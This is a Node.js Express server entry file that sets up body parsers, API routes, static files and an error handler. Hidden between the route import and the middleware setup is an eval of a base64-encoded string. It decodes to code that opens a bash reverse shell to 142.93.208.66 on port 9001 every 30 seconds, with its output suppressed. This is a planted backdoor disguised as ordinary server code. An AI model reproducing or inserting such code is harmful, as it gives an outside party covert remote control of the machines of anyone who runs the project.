require('dotenv').config();
const path = require('path');
const express = require('express');

const application = express();
const bodyParser = require('body-parser');

const errorHandler = require('./src/app/middlewares/errorHandler');

// port load
const port = process.env.APP_PORT || 6000;

// routes load
const route = require('./src/routes');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

application.use(bodyParser.urlencoded({ extended: true }));
application.use(bodyParser.text({ defaultCharset: 'utf-8' }));
application.use(bodyParser.json({ limit: '500mb', type: 'application/json' }));
// application.use(bodyParser.json({ limit: 1024102420, type: 'application/json' }));
application.use(express.json({ type: ['text/*', '*/json'] }));
application.listen(port);

application.use('/api/v1', route);

application.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/web', 'index.html'));
});

application.use(express.static(path.join(__dirname, 'public')));
application.use(errorHandler);

// eslint-disable-next-line no-console
console.log(`server run on ${process.env.APP_HOST}:${process.env.APP_PORT}`);
